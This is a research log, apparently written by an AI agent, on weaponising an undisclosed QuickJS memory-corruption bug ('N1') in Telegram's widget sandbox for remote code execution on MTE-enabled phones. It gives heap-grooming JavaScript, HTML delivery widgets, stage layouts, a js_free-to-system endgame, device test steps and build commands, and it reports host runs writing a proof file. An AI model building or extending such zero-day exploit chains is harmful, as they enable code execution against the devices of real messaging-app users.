# New 0day hunt for MTE-on widgets — N1 real-ABUF same-tag chain, sibling-script widget, and the 4 KiB status

Date: 2026-11-07. Host-only: no adb, no device, no Frida, no bot, no network.
Target engine: quickjs snapshot **2dfeee3e** (`libtmessages.49.so`, 72889/72929)
and quickjs-ng **e22ce4d** for the host twin. The app heap model is **6 MiB**
(`twidget_JSInterruptRuntime_ctor` → `JS_SetMemoryLimit(rt, 6291456)`), 300 ms
CPU quota.

This note is the deliverable of the `new_0day_mte_specs` subtask. It does **not**
replace `notes/MTE_safe_hunt_20261107.md` (the measured MTE/MIE model) and does
not touch `notes/audit_n1_weaponization.md` (the original N1 chain). It records
what was searched, what is delivered, and the exact remaining gap.

---

## 0. Verdict (short)

1. **No new memory-safety bug was found** in this session. The only 0day with an
   MTE-on profile remains **N1** (`push_scope` OOM → fake `JSVarScope` chain →
   `add_scope_var` 32-bit write at `scopes + 20*level + 4`).
2. **The fake-object variant is not reachable** with the N1 write: the write is
   a 32-bit `var_idx` (≤ 65535) at a 20-byte grid address. A fake
   `JSArrayBuffer` referenced by a JSValue requires a 64-bit pointer write (or a
   leak + UAF); the N1 store cannot create one. The reachable target is a
   **real `JSArrayBuffer` struct**, exactly what the original N1 does.
3. **N1 is same-tag by construction for this engine**: `scopes` and the victim
   `JSArrayBuffer` struct are both QuickJS-arena blocks in 64 KiB
   `PROT_READ|WRITE`, non-`PROT_MTE` `mmap`s (tag 0). The measured model in
   `MTE_safe_hunt_20261107.md` §2.3/§2.4 applies; the N1 store is the same
   tag-0 domain as the v7 `W[(k+56)/8]` store.
4. **The widget-wrapper 6 MiB blocker is solved without changing the chain**:
   the old widget read the stage source with `textContent` and `eval`ed the JS
   string, adding ~8.3 KiB live at the critical parse and shifting the 20-byte
   OOM window. The shipped sandbox evaluates sibling `<script>` blocks as
   separate `JS_Eval`s and continues after a throw (proven by the parser
   widget). Delivering the N1 stages as **plain sibling `<script>`s removes the
   stage-source string from the heap** and restores the C-loaded 6 MiB tuning.
   Host: **5/5 full chain**, `ABLEN=1024` → `TRIGGER=23` → `FINAL=AFTER` →
   `/tmp/n1_rce_proof`, at exactly `QJS_HEAP_LIMIT=6291456`.
5. **Sizes**: full sibling widget **17,096 raw / 6,618 zlib9** (6 MiB profile)
   and **17,147 raw / 6,637 zlib9** (8 MiB profile) — under 32,768, over
   4,096 → DB-only; probe widgets **7,679 / 2,966** (6 MiB) and
   **7,732 / 2,987** (8 MiB), both ≤ 4,096, with markers `N1AB ABLEN=…`
   / `N1AB8 ABLEN=…`. The ≤4,096 *full RCE* needs the compact
   AB-only stage (1,498 B, self-calibrating F2) whose gate/FK2/TD2 tuning is
   still open (§5). No device MTE claim is made.

---

## 1. MTE model used (measured, not assumed)

From `notes/MTE_safe_hunt_20261107.md` (host instrumentation + the Pixel 9
debug-run smaps; quoted here because it decides what "same-allocation" means):

* The Telegram QuickJS fork allocates every block ≤ 512 B from **64 KiB slabs
  obtained with `mmap(NULL, 65536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON,
  …)`** (`JS_ARENA_SLABS`, `arena_slab_take`, quickjs.c:1881). The mapping is
  not `PROT_MTE` and not Scudo-managed: **tag 0, never checked**.
* Blocks > 512 B go to `js_malloc` → Scudo primary (tagged, < 64 KiB) or
  secondary (≥ 64 KiB; on the measured Android 17 smaps some secondary prefixes
  carry `mt`, so this is not assumed untagged).
* Scudo tags a primary chunk randomly; a free retags; headers are tag 0;
  adjacent chunks are parity-biased. A pointer with tag 0 into tagged memory
  faults exactly like a tagged pointer into tag-0 memory.
* **Authoritative device datum (orchestrator):** the Pixel 9 had MTE active
  from Developer Options and the **v7 full C2 (`tg-10290-Pixel_9`) ran with
  MTE on without a crash.** The v7 same-view/same-allocation pattern is
  therefore **MTE-safe proven**, not a hypothesis. The mechanism is the
  arena/tag model above (and the v3 MTE-on debug run: every touched address
  was `mt=False`, `D`/`shape`/`proto` in the arena, the tagged `ctx`/`rt`
  dereferenced with the pointer's own tag). The v7 guarantee is "the engine's
  private arena is outside the tagged allocator", plus tag-preserving pointer
  arithmetic (`BigInt.asUintN(64, …)`).

**Consequence for N1.** The store address is
`scopes + 20*level + 4`; `scopes` is a class-128 arena block and the target is
a class-64 arena block (`JSArrayBuffer`, 56 B). Both are QuickJS arena `mmap`s
→ tag 0. The write does not cross a tag boundary; the only tagged accesses in
the chain are `ctx`/`rt`, read as full 64-bit pointers from memory and
dereferenced with their own tag (the v7 rule). This is the same profile as
v7, not a new claim.

The word "same-allocation" in the task is therefore satisfied in the sense that
matters for MTE: **the corruption never leaves the tag-0 arena domain**. It is
not a single malloc block; the model note already established that v7's
`W[(k+56)/8]` is same-view and only tag-0-safe because both blocks are arena.
N1's real-ABUF write has the identical property.

---

## 2. Why the fake-object (`JSVarScope` + internal fake ABUF) variant is dead

The N1 primitive is exactly (app snapshot `2dfeee3e`,
`add_scope_var`):

```c
int idx = add_var(ctx, fd, name);          /* <= var_count, <= 65535 in the
                                              reachable 6 MiB parses */
...
fd->scopes[fd->scope_level].first = idx;   /* 4-byte store at
                                              scopes + 20*level + 4 */
```

The fake chain (`scopes[-1].parent = -2`, `[-2] = -3`, `[-3] = -4`,
`[-4] = -45` or `TD2`) is read from the class-128 block immediately before the
`scopes` array; the last entry's `parent` selects any 32-bit `level`, and the
store writes the small `idx`.

To make a **fake object inside a controlled buffer** useful, a JSValue must
point at it. The only ways to obtain such a pointer are:

* a 64-bit write into an object/typed-array pointer field — N1 cannot write
  64 bits, and the 32-bit value is a small index, not a heap pointer;
* a UAF reclaim where a JSValue still points at a freed block that was reused
  by attacker data — that is a different bug (type confusion), and none of the
  current 18 findings provides a JSValue-to-controlled-buffer alias reachable
  in a single widget eval (N1's own leak is a forward string read, F1 is a
  read-only regexp UAF, C1/C2 are cross-tag or fixed).

Therefore the fake-object framing was dropped, as directed. The remaining N1
target is the **real** `JSArrayBuffer` struct, whose `byte_length` at +0 is
written by the same 4-byte store. This is what the host chain uses and what the
sibling widget delivers.

Rejected candidates (details in `MTE_safe_hunt_20261107.md` §6):
C1 (write into a tag-0 chunk header through a tagged cpool pointer), C2
(second-order `fd->vars` read is tagged), parser `ARG_SCOPE_END` (1.31 MB
displacement from a tagged `b->vardefs`), N2/S1 (+0x7fff8 from a small array),
litehtml span (C++ heap previous chunk). R1/R2/F1/FR are read-only/DoS.

---

## 3. The widget-wrapper 6 MiB blocker and its fix

### 3.1 What the old widget did

`lab/qjs_n1/widget/n1_debug_72879.html` and the `n1_lean6_*` variants use:

```html
<script type="text/plain" id="s1">STAGE1</script>
<script>var s=document.getElementById("p").textContent;(0,eval)(s);</script>
```

`textContent` returns the stage source as a **JSString** of 7,454 B; it stays
live for the whole `eval(s)`. The measured overhead at the critical parse is
**8,320 B** (`used=106,400` in the wrapper vs `98,080` C-loaded for the same
script point). The N1 gate is a 20-byte free window (`used=6,291,440`,
`sum=6,291,500 > 6,291,456` in the C-loaded reference); an 8.3 KiB shift cannot
be compensated by the big filler because the big filler's charge is
page-rounded (`BIG1` steps of 4,096 change `used` by 4,096, not by the requested
delta). The `app_stage` sweep reproduced the failure modes:

| wrapper tuning | result |
|---|---|
| original `BIG1=6,074,000,T1=4,100` | `InternalError: out of memory` before the leak/AB |
| `BIG1-8088`, same T1 | first 6→9 grow succeeds; no fake chain; plain SEGV at `scopes[-1]` |
| `BIG1-4232` | both grows succeed; `ABLEN=64` |
| `BIG1-3232..` | `InternalError` (big1 allocation itself fails) |

This is the documented blocker from `audit_n1_weaponization.md` §8.9
("wrapper-context caveat"): the same file in `build/app` gives `ABLEN=1024`,
in `app_stage` it does not.

### 3.2 The fix: sibling `<script>`s (the shipped sandbox model)

The parser widget `zeroday_hunt_parser/device/widget/c2560_final_c2560s_72929.html`
is built from **plain sibling `<script id="stageA">` blocks**; the sandbox
evaluates each block as a separate `JS_Eval` and continues after a stage
throws. That is the same boundary as `n1_hookfree/harness/run_multi.c` /
`qjs_n1/harness/app3.c`.

Delivering N1 the same way removes the `textContent` JSString entirely: the
stage source is the script text, not a heap string. The stage order is:

```html
<!doctype html><body>Ok
<script>STAGE1</script>
<script>STAGE2</script>
<script>STAGE3</script>
```

* STAGE1 = `poc/poc_n1_ab_len.js` (N1 fake chain → `AB.byteLength = 1024`;
  throws `LEAK=… ABLEN=1024 VIEW=1024` at the end).
* STAGE2 = `poc/trigger_re.js` (the 1024 view overwrites a live RegExp
  bytecode with the PR#1827 fake program; `exec` writes 0x7a000000+8j into the
  class-64 victim `ArrayBuffer` structs; throws `TRIGGER=23 BL=2046820360`).
* STAGE3 = the #1827 pivot/ctx/`js_free=system` endgame (host CFG
  `JS_DEF_FREE=0x45940` for the sibling build; `0x45b20` for `build/app3`;
  the correct value is `js_def_free`'s offset in the built binary — a stale
  constant gives `FINAL=NO_SYS`, not a chain failure).

STAGE2 already starts with `big2=null;tune2=null;tune3=null;src1=null;src2=null`
so no external `<free1>` helper is needed between the stages. STAGE1's globals
(`AB`, `ABV`, `T`) survive its throw.

### 3.3 Host evidence

Harness `/tmp/opencode/n1sib/run_sib.c`: reads an HTML, evaluates every
`<script>…</script>` block as a separate `JS_EVAL_TYPE_GLOBAL`, continues after
exceptions, one runtime/context, 6 MiB, 512 KiB stack, 300 ms interrupt.

```
QJS_HEAP_LIMIT=6291456 /tmp/opencode/n1sib/run_sib widget/n1_sibling_host.html
[<s0>] Error: Error: LEAK=… ABLEN=1024 VIEW=1024
[<s1>] Error: Error: TRIGGER=23 BL=2046820360 HITS=10
[<s2>] Error: Error: FINAL=AFTER
SIB_DONE scripts=3
```

5/5 runs wrote `/tmp/n1_rce_proof` (`uid=1000(user) …` + `N1RCE`). The same
three sources through `build/app3` (clang, `JS_DEF_FREE=0x45b20`) also give
5/5.

Both app-heap profiles are delivered, because the 72929 build may use 8 MiB
while the 72799/72879 decompile showed 6 MiB:

| profile | STAGE1 | heap | full widget | probe |
|---|---|---|---|---|
| 6 MiB | `poc/poc_n1_ab_len.js` (7,454 B) | 6,291,456 | 17,096 / 6,618 | 7,679 / 2,966 |
| 8 MiB | `lab/s8.js` (7,505 B) | 8,388,608 | 17,147 / 6,637 | 7,732 / 2,987 |

8 MiB sibling runs: 5/5 `ABLEN=1024` → `TRIGGER=23` → `FINAL=AFTER` → proof
(`logs/n1_sibling_host8_5x.txt`; probe `logs/n1_probe_host8.txt`).

The heap-limit sweep shows the filler is exactly the app profile:

| heap limit (6 MiB stage) | result |
|---|---|
| 6,291,456 (6 MiB) | `ABLEN=1024`, `FINAL=AFTER`, proof 5/5 |
| 6,000,000 / 5,800,000 / 5,500,000 | no proof (gate misses) |
| 8,388,608 | no proof (the 6 MiB filler no longer fills the heap) |

So the widget is a heap-profile payload, not a fixed 8 MiB payload; ship the
matching variant for the app's measured limit.

Artifacts (added, nothing deleted):

```
lab/qjs_n1/widget/n1_sibling_host.html   17,096 raw / 6,618 zlib9 (6 MiB)
lab/qjs_n1/widget/n1_sibling_host8.html  17,147 raw / 6,637 zlib9 (8 MiB)
lab/qjs_n1/widget/n1_probe_host.html      7,679 raw / 2,966 zlib9 (6 MiB)
lab/qjs_n1/widget/n1_probe_host8.html     7,732 raw / 2,987 zlib9 (8 MiB)
/tmp/opencode/n1sib/run_sib.c             sibling-script harness (source)
/tmp/opencode/n1sib/run_sib               clang -O2 -DNDEBUG -I src
/tmp/opencode/n1sib/endg_sib.js           host endgame, JS_DEF_FREE=0x45940
/tmp/opencode/n1sib/out*.txt, final*.out  run logs
lab/qjs_n1/logs/n1_sibling_host_5x.txt    6 MiB 5/5 log + proofs
lab/qjs_n1/logs/n1_sibling_host8_5x.txt   8 MiB 5/5 log + proofs
```

---

## 4. Probe widget (≤ 4,096) and markers

`widget/n1_probe_host.html` = STAGE1 + a marker script:

```html
<div id="v">Ok</div>
<script>…N1 AB stage…</script>
<script>
try{var d=document.getElementById("v");if(d)d.textContent="N1AB ABLEN="+AB.byteLength;}catch(e){}
throw new Error("N1AB ABLEN="+AB.byteLength);
</script>
```

The 8 MiB twin is `widget/n1_probe_host8.html` (marker `N1AB8 ABLEN=…`).

Markers and interpretation:

| marker | meaning |
|---|---|
| `LEAK=<hex> ABLEN=1024 VIEW=1024` | stage 1 hit: fake chain and the AB store worked |
| `N1AB ABLEN=1024` | the cross-stage global survived; delivery model is correct |
| `LEAK=NaN… ABLEN=64` | the fake chain did not fire (gate/adjacency miss) |
| `InternalError: out of memory` (uncatchable) | the OOM happened before the fake pop; the stage source is again a heap string (check that the block is a plain `<script>`, not `text/plain`+`eval`) |
| `SIB_DONE scripts=2` | both blocks were evaluated; the sandbox continued after the throw |

The probe is the first device test: it proves the **delivery model** and the
6 MiB gate in one message, without the destructive endgame.

---

## 5. The 4 KiB full-RCE gap (honest)

The 17,096/6,618 full widget is **DB-only**. To get the full chain under 4,096
zlib we need to replace the 7,454-byte STAGE1 with a compact stage. Two
artifacts exist:

* `lab/gen_stage1_widget.py` (2,070 B) builds `src1`/`src2` from a name table
  at runtime. Its heap phase differs (the name table/atoms and the runtime
  strings are live at the gate). On the host it does **not** reproduce the
  C-loaded 6 MiB tuning: the `BIG1` sweep shows the first 6→9 grow succeeding
  at `used≈6.21M`, and the tune1 `ArrayBuffer` allocation fails before the
  grow can be pushed to the 180-byte limit (the pre-tune1 live set is ~6.28M
  while the grow-time used is ~6.21M; the 67 KiB delta is parser/temporary
  state freed between the two points). Exact failing point:
  `N1ABUF … len=76000 data=(nil)` → `InternalError`.
* `lab/gen_ab_only.py` (1,498 B) is the F2 self-calibrating AB-only stage:
  fill class-80 `{}` to OOM (bare-null catch), free a bounded `POOL` of
  class-192 strings, eval the AB source, retry, stop when `AB.byteLength>64`.
  Host at 6 MiB: **42 ms**, `A0..A7 L64nc` (the bare-null catch works; the
  gate/FK2/TD2 are untuned). This is the right base for the 4 KiB widget: it
  has no big filler and its retry loop is the calibration. The open items are
  (a) the class-128 FK2 adjacency to the `scopes` block, (b) the pool count
  range, (c) `TD2`.

`TD2 = (ABUF - scopes - 4)/20` is the only value that still required the
in-process observer. Host measurement with the original groom:

```
scopes = 0x…506890   ABUF = 0x…4cea20   delta = -228,976   TD2 = -11,449
```

i.e. the class-128 `scopes` arena and the class-64 `ABUF` arena are ~3.5 × 64
KiB apart (different slabs, but both tag 0). On the device the hooked chain
measured deltas of hundreds of MB. **Hook-free TD2 therefore needs same-64 KiB
slab grooming**: allocate the victim `ArrayBuffer` and the `scopes` array so
their class pages come from the same `arena_slab` (the slab allocator takes
4 KiB slots for different classes from one 64 KiB `mmap`). Then `TD2` becomes a
small layout constant (± a few hundred) and can be baked or swept safely inside
mapped arena memory. This grooming is the documented minimum next step; it is
not claimed as done.

A blind TD2 sweep over the device range is **not** safe: a wrong level writes
the small `idx` at an arbitrary address, and the device deltas are 10^2–10^8
bytes.

---

## 6. Device test plan (orchestrator; no device touched here)

Context: the N1 host chain was already 5/5, and the device hook-assisted chain
was 5/5 (mega_chain). What is new here is the **pure widget form** (sibling
scripts, no `textContent`/`eval` wrapper, no Frida in the chain) and the host
proof that the 6 MiB gate survives that form. The only hook-supplied value that
the pure form still lacks is `TD2` (§5); the probe and the AB-only stage are
the tools for the device calibration.

### 6.1 Android 72929, MTE-on

1. Mode check (authoritative):
   `getprop ro.arm64.memtag.bootctl_supported`, `getprop arm64.memtag.bootctl`,
   `getprop persist.arm64.memtag.app_default`, `dumpsys package <pkg> | grep -i
   memtag`; enable for the package (`am compat enable NATIVE_MEMTAG_SYNC <pkg>`
   or the per-package `persist.arm64.memtag.app.<pkg> on`), restart.
2. Coverage: `grep -c " mt " /proc/<pid>/smaps`; resolve the addresses the
   payload prints (`scopes`, `ABUF`, `D`, `shape`, `proto`, `ctx`, `rt`,
   `js_free`, `system`) and check `mt` on each. Expect the QuickJS arena
   (`scopes`, `ABUF`, `D`) to be `mt=False`; that is the same-tag domain.
3. **Run the matching probe first** (`widget/n1_probe_host.html` for a 6 MiB
   app, `widget/n1_probe_host8.html` for 8 MiB; retarget the constants only if
   the endgame is included — the probe itself only needs STAGE1 + marker).
   Expected: `N1AB ABLEN=1024` (or `N1AB8`) and the stage-1 `LEAK=…` line; the
   app stays alive. If `ABLEN=64`, the gate missed: do not run the destructive
   stages; run the AB-only retry probe (below) and sweep the profile knobs.
4. Full chain: STAGE1 + STAGE2 + STAGE3 with the app's `JS_DEF_FREE/FREE_GOT`
   (runtime ELF resolver preferred; the v7 universal resolver already does
   this). Expected: `TRIGGER=23 BL=2046820360`, `FINAL=AFTER`, proof file. A
   crash after `AFTER` is acceptable (the hook is destructive at teardown).
5. Fault signature: `SEGV_MTESERR`/`SEGV_MTEAERR` with a pointer tag in the
   address means a tag mismatch; a plain `SEGV_ACCERR` on an unmapped address
   is a layout/TD2 miss, not MTE. The arena write is expected **not** to fault.

### 6.2 iOS 13.2 / quickjs-ng v0.17.0 (iPhone 6s / 17)

The iOS 27 primitive is the same #1827 class-64 chain
(`ios_poc_20261106/ios17_rw3.html`, `notes/ios27_iphone17_test.md`). The N1
stage is engine-independent JS; the iOS endgame needs its own
`js_def_free`/`free` resolver and the app proof path. MIE is opt-in for
third-party apps (`com.apple.security.cs.checked_allocations`); the stock
Telegram entitlement has no such key, so the first iOS run is an MIE-off datum
unless the orchestrator installs an opted-in build. The same-tag model predicts
the arena write is MIE-invisible; the `ctx`/`rt` accesses must keep their
pointers whole (the v7 rule). No iOS claim is made here.

### 6.3 If the probe misses on 6 MiB

The 6 MiB tuning is glibc/usable-size dependent. The device knob order:
`BIG1/BIG2` page steps (±4,096), then `T1/T2` class steps, then `ND` for the
20-byte grid. Use the probe (non-destructive) for each step; the AB-only F2
stage is the fallback because its `POOL` retry is layout-relative. Document the
successful pair in the note and keep the app alive.

---

## 7. Honest verdict and next surface

* **No new 0day** was found. The search covered the parser/scope, RegExp
  bytecode, typed arrays/RAB, BigInt, GC/arena, async/promise, JSON/string and
  the class-64 ArrayBuffer surfaces; the 18-bug matrix in
  `MTE_safe_hunt_20261107.md` §6 already classifies the known ones. The new
  parser bug and C1/C2 are structurally cross-tag; N1 is the only same-tag
  carrier.
* The **same-allocation fake-object** refinement is impossible with the N1
  32-bit write; the real-ABUF target is the correct interpretation.
* The **wrapper blocker** is solved by sibling scripts (host 5/5, 6 MiB).
* The **4 KiB full RCE** is not solved; the compact AB-only stage is the
  tool, with the three open items above. The probe is ≤4,096 and ready.
* MTE-on is **not claimed** for any device in this note. The prediction is
  that the N1 arena write is tag-invisible; the proof must come from the
  orchestrator's MTE-on run (smaps + no `SEGV_MTESERR` + proof file).

Fuzz surface to pursue next (MTE-aware, same-tag only):

1. arena-block UAF/type confusion whose freed block is reused by a JSObject or
   a typed-array struct (same 64 KiB slab, tag 0) — N1 is one; look for a
   second in `js_free_shape` zombie shapes, `JSVarRef` detach, and
   `JSArrayBuffer.array_list` finalizer order;
2. class-128/class-192 `JSArrayBuffer`/`JSVarScope` interactions with the
   `arena_slab_take` slot reuse (same-slab TD2 grooming);
3. F2 (bare-null OOM) + `push_scope` gate variants that do not need a big
   filler (the AB-only stage).

---

## 8. Reproduction commands

```bash
# host twin (clang, 6 MiB)
cd telegramandroidwidget/lab/qjs_n1
clang -O2 -DNDEBUG -I src harness/app3.c src/quickjs.c src/libregexp.c \
  src/libunicode.c src/dtoa.c -lm -o build/app3
./build/app3 poc/poc_n1_ab_len.js poc/trigger_re.js /tmp/opencode/n1sib/endg_sib.js

# sibling widget (the shipped model)
clang -O2 -DNDEBUG -I src /tmp/opencode/n1sib/run_sib.c src/quickjs.c \
  src/libregexp.c src/libunicode.c src/dtoa.c -lm -o /tmp/opencode/n1sib/run_sib
QJS_HEAP_LIMIT=6291456 /tmp/opencode/n1sib/run_sib widget/n1_sibling_host.html
QJS_HEAP_LIMIT=8388608 /tmp/opencode/n1sib/run_sib widget/n1_sibling_host8.html
QJS_HEAP_LIMIT=6291456 /tmp/opencode/n1sib/run_sib widget/n1_probe_host.html
QJS_HEAP_LIMIT=8388608 /tmp/opencode/n1sib/run_sib widget/n1_probe_host8.html
cat /tmp/n1_rce_proof

# compact AB-only exploration
python3 lab/gen_ab_only.py /tmp/opencode/abo.js 0 1 200 20 16 1020 400 159 0
./build/app /tmp/opencode/abo.js
```

## 9. Files

```
notes/new_0day_mte_specs_20261107.md      this note
notes/LEMMALOG_FACTS_n1_sibling_20261107.txt  facts for the orchestrator
lab/qjs_n1/widget/n1_sibling_host.html    full sibling widget (6 MiB host)
lab/qjs_n1/widget/n1_sibling_host8.html   full sibling widget (8 MiB host)
lab/qjs_n1/widget/n1_probe_host.html      probe widget <= 4 KiB (6 MiB)
lab/qjs_n1/widget/n1_probe_host8.html     probe widget <= 4 KiB (8 MiB)
lab/qjs_n1/poc/poc_n1_ab_len.js           STAGE1 6 MiB (N1 AB length)
lab/qjs_n1/lab/s8.js                      STAGE1 8 MiB (N1 AB length)
lab/qjs_n1/poc/trigger_re.js              STAGE2 (RegExp bytecode + victims)
/tmp/opencode/n1sib/endg_sib.js           STAGE3 host endgame (0x45940)
/tmp/opencode/n1sib/run_sib.c             sibling-script harness
lab/qjs_n1/logs/n1_sibling_host_5x.txt    6 MiB 5/5 logs
lab/qjs_n1/logs/n1_sibling_host8_5x.txt   8 MiB 5/5 logs
/tmp/opencode/n1sib/out*.txt, final*.out  extra host logs
```

No files were deleted; no device, Frida, n-day, bot or network was used.

---

## 10. Device result on Sony 72929 (2026-11-07) — correction and new probe

### 10.1 What the device showed

Two DB-harness probes were delivered to the Sony XQ-BT52 (Android 13,
Telegram beta 72929):

| widget | payload | log | bubble |
|---|---|---|---|
| `n1_probe_host8.html` | zlib 2,987 → 7,732 B | `device_parser_rce/n1_probe/probe8.log` | `Ok` + "Widget st…", **no `N1AB8 ABLEN=`**, app alive (pid 16708) |
| `n1_probe_host.html` | zlib 2,966 → 7,679 B | `.../probe6.log` | `Ok` + "Widget st…", **no `N1AB ABLEN=`**, app alive (pid 16990) |

The logs contain only `widget payload: zlib, N -> M bytes`; no JS exception and
no marker. The parser widget's stage A ends with a **catchable**
`throw new Error("RESULT …")` and its stage B/C run on the same device, so the
sandbox does continue after a catchable throw. Therefore our stage A died with
an **uncatchable** exception (InternalError: out of memory) before its final
`throw`, and the second `<script>` (the marker) never ran. The bubble "Ok" is
the static body.

This is exactly what the **fork** does on the host at 6 MiB (see §10.2), and it
is not what the upstream `qjs_n1` build does at 6 MiB (where the same stage is
5/5). The host 5/5 was tuned on the wrong allocator.

### 10.2 Root cause: two different arena allocators

| | `qjs_n1` host (e22ce4d) | device engine (2dfeee3e) |
|---|---|---|
| small blocks (≤512 B) | classic quickjs arena: a **separate `js_malloc` per 4 KiB arena** | `JS_ARENA_SLABS`: 64 KiB `mmap` slabs, 4 KiB class pages carved from them |
| JS limit charge | every alloc counts toward 6 MiB | **small blocks are carved from mmap slabs and do not charge the limit**; only large blocks + `JSArenaSlab` metadata do |
| N1 gate | `js_realloc(scopes, 180)` fails when `malloc_size+180 > limit`; the 20-byte filler window is the gate | the 180-byte scopes grow is a small block: it **succeeds from the slab** regardless of the limit unless a new class page/slab is needed and the slab-metadata `js_malloc` fails |
| OOM error object | small; when the heap is dominated by the big filler it cannot allocate → bare-null catchable (F2) | small; it allocates from a slab, so the OOM error object normally **does** allocate → InternalError, uncatchable |

Host proof on the exact fork (`lab/qjs_fork_audit/n1_fork/build/run6m`, built
from `zeroday_hunt_parser/src` = 2dfeee3e with N1 trace prints):

```
$ N1_TRACE=1 ./build/run6m -l 6 poc_n1_ab_len.js
...
N1PUSH ... scopes=0x...c738 bs=128 idx=14 slab=... slot=2
N1ADD ... level=4 ... used=6291192 lim=6291456
N1NEWARENA cls=1 slab=... slot=5
EXCEPTION: InternalError: out of memory
```

The scopes grow **succeeds** (the trace shows the 6-entry class-128 page and
later grows); the OOM is a large-block allocation (`vars`/bytecode) with the
error object allocatable → uncatchable. The stage dies before `AB`/the marker.
At 8 MiB the same stage does not OOM but the gate **misses**:
`LEAK=NaN… ABLEN=64` (host, `run_sib_plain -l 8`).

The earlier `n1_hookfree`/parser worker used the same fork build and the same
conclusion for their stages (the parser 0day needs no OOM, which is why it
worked on device).

### 10.3 Heap size of 72929: 6 MiB (decompile; device probe pending)

The `memoryLimitBytes = 8 MiB` field in the JNI options is the renderer/options
field; the QuickJS runtime is `JS_SetMemoryLimit(rt, 6291456)` in
`twidget_JSInterruptRuntime_ctor` (`notes/twidget_interrupt_re.md`). The device
behaviour agrees: the 8 MiB stage (`s8.js`, big1 8.17 MB) could not even
allocate its filler on the device, so it died before its marker; the 6 MiB
stage dies in `eval(src1)` for the allocator reason above, also before its
marker. Neither is a heap-size measurement by itself; the new heap probe below
is.

Delivered heap probe (`lab/qjs_n1/widget/device/n1_probe_heap.html`,
360 raw / 239 zlib):

```html
<div id="v">Ok</div>
<script>
(function(){
 var V=null;try{V=document.getElementById("v");}catch(e){}
 function M(s){try{if(V)V.textContent=s;}catch(e){}}
 M("P0 START");
 try{var A="x".repeat(6200000);M("P1 H6OK");A=null;}catch(e){M("P1 H6NO");}
 try{var B="x".repeat(7500000);M("P2 H8OK");B=null;}catch(e){M("P2 H8NO");}
})();
</script>
```

Host fork validation (`run_sib_plain`, VDOM marker):

| limit | VDOM | meaning |
|---|---|---|
| 6 MiB | `P0 START` | the 6.2 MB allocation failed uncatchably before `P1` |
| 8 MiB | `P2 H8OK` | both 6.2 MB and 7.5 MB fit |

On the device: `P2 H8OK` ⇒ 8 MiB; `P1 H6OK`/`P2 H8NO` ⇒ 6–7.5 MiB;
`P0 START` ⇒ ≤6.2 MiB (expected 6 MiB).

### 10.4 Revised diagnostic probe (device marker mechanism)

`lab/qjs_n1/widget/device/n1_probe_stage.html` (7,746 raw / 3,011 zlib) is the
6 MiB stage with **in-stage** `#v` markers using the same
`document.getElementById("v").textContent` mechanism as the device-proven
c2560s stage C:

```
S0 START → S1PRE → (eval src1) → S1OK → S2PRE → (eval src2) → S2OK → S3 LEAK=… ABLEN=…
```

Host fork (`run_sib_plain -l 6`): `VDOM=S1PRE` + `InternalError: out of
memory` — the marker before the failing eval survives, exactly what the device
must show. At 8 MiB: `S3 LEAK=NaN… ABLEN=64` (gate miss, no crash). This probe
is non-destructive: it never runs the trigger/endgame, and the only possible
write is the fake-scope leak (which is a valid field write).

Device run order (recommended):

1. `n1_probe_heap.html` → read `#v`/`VDOM`: fixes the heap profile (expected
   `P0 START` on 6 MiB).
2. `n1_probe_stage.html` → read `#v`: if `S1PRE`, the stage dies in
   `eval(src1)` (uncatchable OOM) as on the host; if `S3`, the upstream gate
   missed but the delivery works.
3. Only after the fork-native gate (§10.5) is host-tuned, run the gate probe
   and then the full chain.

### 10.5 Same-64 KiB slab grooming and the hook-free TD2

The fork's slab geometry can be measured on the host with the new
`n1_slot_of()` trace. A JS groom of the form

```js
for (i=0;i<63;i++) keep.push(new ArrayBuffer(16)); // fill the class-64 page
var VICT = new ArrayBuffer(16);                    // victim struct
for (i=0;i<31;i++) keepS.push(('q'+i+':').padEnd(95,'P')); // class-128 page
eval("try{}catch([a0,a1,a2]){}try{}catch([a3,a4,a5,a6]){}…");
```

produced on the host (`/tmp/opencode/slabgroom.js`):

```
N1ABUF_STRUCT <victim> bs=64 idx=7 ar=0x...850000 slab=0x...f00420 slot=10
N1SCOPES      <scopes> bs=128 idx=15 ar=0x...851000 slab=0x...f00420 slot=11
```

i.e. **the victim ArrayBuffer struct and the `fd->scopes` array are in
adjacent 4 KiB pages of the same 64 KiB slab** (slots 10 and 11). The distance
is 5,568 B; with the victim block index chosen as 10 (k ≡ 0 mod 5) and the
scopes at block 15, the store target satisfies the 20-byte grid and

```
TD2 = (VICT - scopes - 4)/20 = -269
```

a **small layout constant**, not a device-specific address. This is the
same-64 KiB grooming the task asked for. The general recipe:

1. force a fresh 64 KiB slab and fill its 16 slots with 4 KiB class pages
   (class-128 strings are the cheapest: 31 strings per page; 16 pages fill a
   slab);
2. make the target class-128 page contain the FK string at block j-1 and leave
   block j free; the parser's 4→6 scopes grow takes j, the FK string is
   `scopes[-1]`, and the page is then full;
3. allocate the victim `ArrayBuffer` so its class-64 page is the **next page
   in the same slab** (slot after the class-128 page); the victim's struct
   block index k is chosen to satisfy k ≡ 2j-3 (mod 5) (for j=15, k ≡ 0 mod 5,
   e.g. k=10 → TD2=-269);
4. make the 6→9 grow require a new class-128 page and exhaust the large-block
   limit so the `JSArenaSlab` metadata allocation fails: this is the fork's
   only enforceable OOM for a small grow (§10.2). Fill the class-80 pages too,
   so the OOM error object also needs a new slab and fails → bare-null catch
   (F2) instead of InternalError.

Hook-free TD2 derivation (design, not yet host-proven): the fake-chain write
can put a **large `idx`** (e.g. 4096) into `T.len` at the fixed level -45 (T is
7 blocks before scopes, as in the original stage). If the class-64 victim page
is placed **after** the class-128 page in the same slab, the enlarged string
reads forward into the victim page. Scanning the string bytes for the
`JSArrayBuffer` signature (byte_length=64, max=-1, plausible data pointer)
yields the victim struct's offset `o` from T's data; since
`T_data = scopes - 104`, `TD2 = (o - 108)/20`. No absolute address and no
observer are needed. The alternative (victim page before the class-128 page)
needs the page order reversed; the current graft puts the victim page after by
allocating the class-128 page first. Both layouts are testable on the host with
`n1_slot_of`.

### 10.6 Status and next host steps (honest)

* The **diagnostic probes are real and host-verified on the exact fork
  allocator**; they explain the device result and give the heap/marker datum.
* The **fork-native gate** (slab-metadata exhaustion + F2) is designed and the
  same-slab layout is measured, but it is **not yet host-proven**: the fill
  counts (16 pages, 63 objects, the exact BIG) and the FK/block index must be
  tuned against `run6m`/`run_sib_plain` at 6 MiB. The first attempts show the
  expected fill geometry but the eval still OOMs in its own large allocations
  before the tuned gate; the sweep is the next host task.
